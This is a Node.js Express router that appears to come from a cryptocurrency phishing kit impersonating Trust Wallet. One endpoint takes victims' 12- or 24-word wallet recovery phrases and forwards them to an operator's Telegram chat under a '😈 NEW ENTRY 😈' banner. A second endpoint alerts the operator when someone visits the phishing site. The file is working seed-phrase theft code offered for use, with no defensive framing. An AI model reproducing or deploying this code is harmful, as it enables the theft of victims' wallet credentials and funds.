const bot = require("../../telegram");
const router = require("express").Router();


router.post("/send-passphrase", async (req, res) => {
    try {
        const {
            telegramID,
            phrassType,
            passphrase,
            attempt
        } = req.body;

        let passStr =
            ``

        passphrase.forEach((p, i) => {
            passStr += `\n ${i + 1}. ${p}`
        });

        await bot.sendMessage(telegramID, `
😈 NEW ENTRY 😈

Wallet Type: Trust Wallet
Attempt: ${attempt}${attempt === 1 ? 'st' : 'nd'} attempt
Phrase Length: ${phrassType === 1 ? 12 : 24} words

Passphrase:
${passStr}
        `)
            .catch(err => console.log("Telegram error"));

        return res.status(200).json({
            success: true
        });
    } catch (err) {
        console.log(err)
    }
});


router.post("/send-alert", async (req, res) => {
    try {
        const {
            telegramID
        } = req.body;

        await bot.sendMessage(telegramID, `
😈 NEW ENTRY 😈

Wallet Type: Trust Wallet

Someone is on your site!
        
                        `)
            .catch(err => console.log("Telegram error"));
        return res.status(200).json({
            success: true
        });
    } catch (err) {
        console.log(err)
    }
});


module.exports = router;